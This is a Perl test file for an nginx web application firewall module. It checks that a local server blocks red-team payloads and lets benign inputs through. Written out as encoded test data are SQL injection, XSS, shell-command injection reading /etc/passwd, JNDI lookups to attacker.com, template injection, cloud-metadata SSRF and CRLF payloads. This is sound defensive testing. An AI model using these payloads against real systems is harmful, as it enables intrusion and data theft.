#!/usr/bin/perl

# (C) vislee

# Semantic-detection tests for the http waf module.
#
# Payloads are drawn from the extended libinjection red-team corpora
# (data/redteam-*.txt, data/benign-*.txt) and were verified one by one
# against the vendored libinjection snapshot with classify_url() (the
# exact API the module calls, on the exact representation the module
# feeds it: raw percent-encoded args values).
#
# One rule per class tag; per-class scoring only credits a tag when the
# payload actually matched that class (cls_mask filtering in score_calc).

###############################################################################

use warnings;
use strict;

use Test::More;

use Socket qw/ CRLF /;

BEGIN { use FindBin; chdir($FindBin::Bin); }

use lib 'lib';
use Test::Nginx;

###############################################################################

select STDERR; $| = 1;
select STDOUT; $| = 1;

my $t = Test::Nginx->new();

$t->write_file('index.html', "ok\n");
$t->write_file('waf_semantic_body.html', "body-ok\n");
$t->write_file_expand('nginx.conf', <<'EOF');

%%TEST_GLOBALS%%

daemon off;

load_module /tmp/nginx/modules/ngx_http_waf_module.so;

events {
}

http {
    %%TEST_GLOBALS_HTTP%%

    # one libinj:all rule per class tag; a rule scores only when the
    # payload matched its tag's class bit
    security_rule id:942950 "libinj:all" "s:$SQLI:5" "z:ARGS";
    security_rule id:941950 "libinj:all" "s:$XSS:5" "z:ARGS";
    security_rule id:932950 "libinj:all" "s:$RCE:5" "z:ARGS";
    security_rule id:930950 "libinj:all" "s:$LFI:5" "z:ARGS";
    security_rule id:934950 "libinj:all" "s:$SSRF:5" "z:ARGS";
    security_rule id:919950 "libinj:all" "s:$SSTI:5" "z:ARGS";
    security_rule id:918950 "libinj:all" "s:$NOSQL:5" "z:ARGS";
    security_rule id:917950 "libinj:all" "s:$LDAP:5" "z:ARGS";
    security_rule id:916950 "libinj:all" "s:$DESER:5" "z:ARGS";
    security_rule id:920950 "libinj:all" "s:$CRLF:4" "z:ARGS";
    security_rule id:911950 "libinj:all" "s:$CODE:5" "z:ARGS";
    security_rule id:913950 "libinj:all" "s:$RECON:5" "z:ARGS";
    security_rule id:923950 "libinj:all" "s:$REDIRECT:5" "z:ARGS";

    # decode chains: base64 / double-url-encoded payloads
    security_rule id:961950 "libinj:decode_base64|all" "s:$SQLI:5" "z:V_ARGS:b64";
    security_rule id:961951 "libinj:decode_base64|all" "s:$XSS:5" "z:V_ARGS:b64";
    security_rule id:961952 "libinj:decode_base64|all" "s:$NOSQL:5" "z:V_ARGS:b64";
    security_rule id:962950 "libinj:decode_url|decode_url|all" "s:$XSS:5" "z:V_ARGS:durl";
    security_rule id:962951 "libinj:decode_url|decode_url|all" "s:$SQLI:5" "z:V_ARGS:durl";

    # same detection over request headers
    # NOTE: deliberately NO $SSRF rule here — Host ("localhost") and similar
    # header values classify as SSRF, so blanket header-zone SSRF blocks every
    # request. The default ruleset must not enable it either.
    security_rule id:971950 "libinj:all" "s:$SQLI:5" "z:HEADERS";
    security_rule id:971951 "libinj:all" "s:$XSS:5" "z:HEADERS";
    security_rule id:971952 "libinj:all" "s:$NOSQL:5" "z:HEADERS";
    security_rule id:971953 "libinj:all" "s:$REDIRECT:5" "z:HEADERS";

    # same detection over the request body
    security_rule id:981950 "libinj:all" "s:$SQLI:5" "z:BODY";
    security_rule id:981951 "libinj:all" "s:$XSS:5" "z:BODY";
    security_rule id:981952 "libinj:all" "s:$NOSQL:5" "z:BODY";

    # wl value constraint moved into the location{} block:
    # security_loc_rule is location-level only (see README)
    server {
        listen       127.0.0.1:8080;
        server_name  localhost;

        location / {
            security_waf on;
            security_log off;

            # wl value constraint (SecRuleUpdateTargetById semantics): rule
            # 941950 is skipped for args "q" when its value matches ^safe
            security_loc_rule "wl:941950" "z:V_ARGS:q~^safe";

            security_check $SQLI>4 BLOCK;
            security_check $XSS>4 BLOCK;
            security_check $RCE>4 BLOCK;
            security_check $LFI>4 BLOCK;
            security_check $SSRF>4 BLOCK;
            security_check $SSTI>4 BLOCK;
            security_check $NOSQL>4 BLOCK;
            security_check $LDAP>4 BLOCK;
            security_check $DESER>4 BLOCK;
            security_check $CRLF>3 BLOCK;
            security_check $CODE>4 BLOCK;
            security_check $RECON>4 BLOCK;
            security_check $REDIRECT>4 BLOCK;
        }
    }
}

EOF

$t->try_run('no waf')->plan(91);

# semantic requests must hit server 8080 of THIS config explicitly:
# http_get() would work here, but keep one fresh connection per request
# so a BLOCK cannot poison the next request on a kept-alive socket.
sub sem_get($) {
    my ($url) = @_;
    my $sock = IO::Socket::INET->new(
        Proto => 'tcp', PeerAddr => '127.0.0.1:' . port(8080)
    ) or die "can't connect: $!\n";
    return http_get($url, socket => $sock);
}

# --- redteam payloads: one rule per class, 4 payloads per class -------------
# every payload below was verified to match its class bit in the vendored
# libinjection snapshot via classify_url() on this exact percent-encoded form
my %redteam = (
    sqli => [
        # redteam-sqli.txt: 1 union select pass from users--
        '1%20union%20select%20pass%20from%20users--',
        # admin'/**/OR/**/1=1/**/#
        'admin%27%2F%2A%2A%2FOR%2F%2A%2A%2F1%3D1%2F%2A%2A%2F%23',
        # 1 and extractvalue(1,concat(0x7e,(select user())))
        '1%20and%20extractvalue%281%2Cconcat%280x7e%2C%28select%20user%28%29%29%29%29',
        # 1' and updatexml(1,concat(0x7e,user()),1)#
        '1%27%20and%20updatexml%281%2Cconcat%280x7e%2Cuser%28%29%29%2C1%29%23',
    ],
    xss => [
        # "><svg onload=alert(1)>
        '%22%3E%3Csvg%20onload%3Dalert%281%29%3E',
        # <iframe src=javascript:alert(1)>
        '%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E',
        # <script src=data:text/javascript,alert(1)></script>
        '%3Cscript%20src%3Ddata%3Atext%2Fjavascript%2Calert%281%29%3E%3C%2Fscript%3E',
        # <math><mtext>...<img src=x onerror=alert(1)> mutation-xss chain
        '%3Cmath%3E%3Cmtext%3E%3C%2Fform%3E%3Cform%3E%3Cmglyph%3E%3Csvg%3E%3Cmtext%3E%3Ctextarea%3E%3Ca%20title%3D%22%3C%2Ftextarea%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%22%3E',
    ],
    cmd => [
        # $(cat /etc/passwd)
        '%24%28cat%20%2Fetc%2Fpasswd%29',
        # $(cat${IFS}/etc/passwd)
        '%24%28cat%24%7BIFS%7D%2Fetc%2Fpasswd%29',
        # ;/bin/sh
        '%3B%2Fbin%2Fsh',
        # ;base64 -d cGF5bG9hZA==|sh
        '%3Bbase64%20-d%20cGF5bG9hZA%3D%3D%7Csh',
    ],
    code => [
        # <%@ page import="java.io.*" %>
        '%3C%25%40%20page%20import%3D%22java.io.%2A%22%20%25%3E',
        # <?= exec('id') ?>
        '%3C%3F%3D%20exec%28%27id%27%29%20%3F%3E',
        # <?= passthru('id') ?>
        '%3C%3F%3D%20passthru%28%27id%27%29%20%3F%3E',
        # <?= shell_exec('id') ?>
        '%3C%3F%3D%20shell_exec%28%27id%27%29%20%3F%3E',
    ],
    deser => [
        # ${${::-j}ndi:rmi://attacker.com}
        '%24%7B%24%7B%3A%3A-j%7Dndi%3Armi%3A%2F%2Fattacker.com%7D',
        # ${${lower:jndi}:${lower:ldap}://attacker.com}
        '%24%7B%24%7Blower%3Ajndi%7D%3A%24%7Blower%3Aldap%7D%3A%2F%2Fattacker.com%7D',
        # ${${lower:j}ndi:${lower:l}dap://attacker.com}
        '%24%7B%24%7Blower%3Aj%7Dndi%3A%24%7Blower%3Al%7Ddap%3A%2F%2Fattacker.com%7D',
        # ${jndi:ldap://attacker.com/a}
        '%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D',
    ],
    ssti => [
        # ${"freemarker.template.utility.Execute"?new()("id")}
        '%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D',
        # ${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}
        '%24%7B%27%27.getClass%28%29.forName%28%27java.lang.Runtime%27%29.getRuntime%28%29.exec%28%27id%27%29%7D',
        # #{7*7}
        '%23%7B7%2A7%7D',
        # {{cycler.__init__.__globals__.os.popen('id').read()}}
        '%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D',
    ],
    trav => [
        # ....//....//etc/passwd
        '....%2F%2F....%2F%2Fetc%2Fpasswd',
        # ..../../..../../etc/passwd
        '..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
        # %00admin (null-byte prefix traversal probe)
        '%00admin',
        # ....\....\windows\win.ini
        '....%5C....%5Cwindows%5Cwin.ini',
    ],
    ssrf => [
        # http://169.254.169.254/latest/meta-data/
        'http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F',
        # url=http://metadata.google.internal/computeMetadata/v1/
        'url%3Dhttp%3A%2F%2Fmetadata.google.internal%2FcomputeMetadata%2Fv1%2F',
        # fetch=169.254.170.2/v2/credentials
        'fetch%3D169.254.170.2%2Fv2%2Fcredentials',
        # http://0x7f000001/
        'http%3A%2F%2F0x7f000001%2F',
    ],
    nosql => [
        # ' || '1'=='1
        '%27%20%7C%7C%20%271%27%3D%3D%271',
        # ?username[$gt]=&password[$gt]=
        '%3Fusername%5B%24gt%5D%3D%26password%5B%24gt%5D%3D',
        # {"$where": "sleep(5000)"}
        '%7B%22%24where%22%3A%20%22sleep%285000%29%22%7D',
        # db.users.find({$gt: ""})
        'db.users.find%28%7B%24gt%3A%20%22%22%7D%29',
    ],
    ldap => [
        # ')(uid=*))(|(uid=*
        '%27%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A',
        # *)(objectClass=*
        '%2A%29%28objectClass%3D%2A',
        # *)(uid=*))(|(uid=*
        '%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A',
        # admin)(password=*)
        'admin%29%28password%3D%2A',
    ],
    crlf => [
        # a\r\nSet-Cookie: p=1
        'a%0d%0aSet-Cookie%3A%20p%3D1',
        # \r\nSet-Cookie:evil=1
        '%0d%0aSet-Cookie%3Aevil%3D1',
        # \r\nLocation: http://evil.com
        '%0d%0aLocation%3A%20http%3A%2F%2Fevil.com',
        # \r\nHTTP/1.1 200 OK (response splitting)
        '%0d%0aHTTP%2F1.1%20200%20OK',
    ],
    recon => [
        # sqlmap/1.5.2#stable (http://sqlmap.org)
        'sqlmap%2F1.5.2%23stable%20%28http%3A%2F%2Fsqlmap.org%29',
        # Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Nikto/2.1.6)
        'Mozilla%2F4.0%20%28compatible%3B%20MSIE%206.0%3B%20Windows%20NT%205.1%3B%20Nikto%2F2.1.6%29',
        # Nessus Vulnerability Scanner
        'Nessus%20Vulnerability%20Scanner',
        # /etc/passwd
        '%2Fetc%2Fpasswd',
    ],
    redirect => [
        # //evil.com
        '%2F%2Fevil.com',
        # ////evil.com
        '%2F%2F%2F%2Fevil.com',
        # javascript:alert(1)
        'javascript%3Aalert%281%29',
        # data:text/html,<script>alert(1)</script>
        'data%3Atext%2Fhtml%2C%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
    ],
);

for my $cls (sort keys %redteam) {
    for my $i (0 .. $#{ $redteam{$cls} }) {
        my $p = $redteam{$cls}[$i];
        like(sem_get("/?q=$p"), qr/403 Forbidden/,
            "waf_semantic_redteam: $cls #" . ($i + 1) . " blocked");
    }
}

# --- benign / false-positive resistance -------------------------------------
# drawn from libinjection data/redteam-benign.txt, benign-recon.txt,
# benign-redirect.txt -- all verified mask=0 in the vendored snapshot
my @benign = (
    'Hello%20world%2C%20this%20is%20a%20normal%20sentence.',
    '%E7%94%A8%E6%88%B7%E5%90%8D%3A%20zhang-san_01',
    'profile_id%3D12345%26sort%3Dasc',
    'it%27s%20a%20beautiful%20day%2C%20isn%27t%20it%3F',
    'price%3A%20%241%2C299.99%20%2830%25%20off%29',
    'base64%3A%20SGVsbG8gV29ybGQhMTIzNDU2Nzg5MGFiY2RlZg%3D%3D',
    'footnote%2012--%20see%20appendix%20for%20details',
    '%3Cdiv%3Esafe%20html%20content%3C%2Fdiv%3E',
    '%3Cp%20style%3D%22color%3A%20blue%22%3Estyled%20text%3C%2Fp%3E',
    'created_at%20%3E%20%272026-01-01%27',
    'article%2Fwhat-is-in-my-environment',
    'https%3A%2F%2Fexample.com%2Fdocs%2Fmaps%2Fapi',
    'django.contrib.admin.site',
    'path%3D%2Fdetail%2F123',
    'next%3D%2Fcheckout%2Fstep2',
    'url%3Dhttps%3A%2F%2Fexample.com%2Fsafe',
    'q%3Dsearch%2Bredirect%2Bterms',
    'cb%3Dhttps%3A%2F%2Fapi.vendor.io%2Fv1',
    'environment%20configuration%20reload',
    '9999999999999999',
);

for my $b (@benign) {
    like(sem_get("/?q=$b"), qr/200 OK/,
        "waf_semantic_benign: allowed ($b)");
}

# --- per-class scoring: a payload must only trip its own class --------------
# XSS payload under the wl:941950 value constraint -> XSS rule skipped and
# (crucially) no SQLI rule fires either => 200 proves per-class isolation
like(sem_get('/?q=safe%3Cscript%3Ealert%281%29%3C%2Fscript%3E'),
    qr/200 OK/, 'waf_semantic_perc: wl-constrained arg whitelisted (no cross-class score)');

# same payload without the constraint -> blocked
like(sem_get('/?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'),
    qr/403 Forbidden/, 'waf_semantic_perc: unconstrained arg blocked');

# constrained name, non-matching value prefix -> blocked
like(sem_get('/?q=unsafe%3Cscript%3Ealert%281%29%3C%2Fscript%3E'),
    qr/403 Forbidden/, 'waf_semantic_perc: non-matching value still blocked');

# SQLi payload in the whitelisted arg name slot: XSS wl does not shield SQLi
like(sem_get("/?q=safe$redteam{sqli}[0]"),
    qr/403 Forbidden/, 'waf_semantic_perc: sqli not shielded by xss wl');

# --- decode chains ----------------------------------------------------------
# NOTE: the module feeds the RAW percent-encoded args value into the decode
# chain, so payloads whose base64 form ends with '=' would arrive as '%3D'
# and fail to decode (ngx http waf decode error). Use plaintexts whose
# length % 3 == 0 (no padding) and escape '+' in the b64 alphabet.
# base64("admin'/**/OR/**/1=1/**/#") via decode_base64|all
like(sem_get('/?b64=YWRtaW4nLyoqL09SLyoqLzE9MS8qKi8j'),
    qr/403 Forbidden/, 'waf_semantic_decode: base64 sqli blocked');

# base64("<script>alert(1)</script>aa") via decode_base64|all -- plaintext
# padded so the b64 form is pure alphanumeric (+/= would arrive raw-encoded
# and break the module's decode chain)
like(sem_get('/?b64=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PmFh'),
    qr/403 Forbidden/, 'waf_semantic_decode: base64 xss blocked');

# base64('{"$where":"sleep(5000)"}') via decode_base64|all
like(sem_get('/?b64=eyIkd2hlcmUiOiJzbGVlcCg1MDAwKSJ9'),
    qr/403 Forbidden/, 'waf_semantic_decode: base64 nosql blocked');

# benign base64("just a benign note") -> 200
like(sem_get('/?b64=anVzdCBhIGJlbmlnbiBub3Rl'),
    qr/200 OK/, 'waf_semantic_decode: base64 benign allowed');

# double-url-encoded <script>alert(1)</script> via decode_url|decode_url|all
like(sem_get('/?durl=%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E'),
    qr/403 Forbidden/, 'waf_semantic_decode: double-encoded xss blocked');

# --- header zone ------------------------------------------------------------
# header values reach libinjection as-sent; both raw and percent-encoded
# forms of these payloads classify identically (verified via vendored probe)
my %hdr = (
    'sqlilib'  => "1%20union%20select%20pass%20from%20users--",
    'xsslib'   => "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
    'nosqlib'  => "{\"\$where\":\"sleep(5000)\"}",
    'redirlib' => "//evil.com",
);
for my $name (sort keys %hdr) {
    like(sem_get_hdr("/?h=$name", "x-probe: $hdr{$name}"), qr/403 Forbidden/,
        "waf_semantic_hdr: $name header blocked");
}

# benign headers must pass (no Connection header: http() reads until EOF)
like(sem_get_hdr('/?h=benign', "User-Agent: Test-Nginx/1.0"),
    qr/200 OK/, 'waf_semantic_hdr: benign headers allowed');

# --- body zone --------------------------------------------------------------
my %body = (
    sqlib  => "1 union select pass from users--",
    xsslib => "<script>alert(1)</script>",
    nosqlib => '{"$where": "sleep(5000)"}',
);
for my $name (sort keys %body) {
    like(http_post_body("/?b=$name", $body{$name}), qr/403 Forbidden/,
        "waf_semantic_body: $name body blocked");
}

# benign body: the WAF lets it through; the static module then rejects POST
# with 405 -- the assertion is "not blocked by the WAF", i.e. no 403
{
    my $r = http_post_body('/?b=benign', 'plain body text');
    unlike($r, qr/403 Forbidden/, 'waf_semantic_body: benign body not blocked');
    like($r, qr/40(0|5)/, 'waf_semantic_body: benign body reaches static module');
}

sub sem_get_hdr {
    my ($url, $extra) = @_;
    my $sock = IO::Socket::INET->new(
        Proto => 'tcp', PeerAddr => '127.0.0.1:' . port(8080)
    ) or die "can't connect: $!\n";
    my $r = "GET $url HTTP/1.0" . CRLF
        . "Host: localhost" . CRLF
        . ($extra ? "$extra" . CRLF : '')
        . CRLF;
    return http($r, socket => $sock);
}

sub http_post_body {
    my ($url, $body) = @_;
    my $r = "POST $url HTTP/1.0" . CRLF
        . "Host: localhost" . CRLF
        . "Content-Type: application/x-www-form-urlencoded" . CRLF
        . "Content-Length: " . length($body) . CRLF . CRLF
        . $body;
    return http($r);
}

###############################################################################

# no done_testing(): Test::Nginx::plan() installs its own exit check
